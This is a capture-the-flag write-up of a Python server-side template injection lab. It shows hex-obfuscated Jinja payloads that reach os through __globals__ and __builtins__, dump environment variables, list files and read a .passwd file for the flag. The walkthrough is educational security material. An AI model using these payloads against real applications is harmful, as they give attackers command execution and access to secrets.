
### Python - Server-side Template Injection Introduction

> The lab presents us a web page that accepts Title and Content to generate our website.

---

## SSTI

> First, I tried `{{ 7*7 }}` as the standard algebra expansion, and only the content part seemed to evaluate the expression, and returned 49. Some payloads like these gave internal server errors:

```
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{{ config }}
```

> So I used an hex obfuscated payload I saved in my notes before, and it worked.

```
{{ self['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('os').environ.items() }}
```

> This dumped the environment variables, so I tweaked it a bit to list the directory contents:

```
{{ self['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('os').popen("ls -la").read() }}
```

> And discovered `.passwd` file. Let's read it.

```
{{ self['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('os').popen("more .passwd").read() }}
```

> The password for this challenge is retrieved, and challenge is completed.
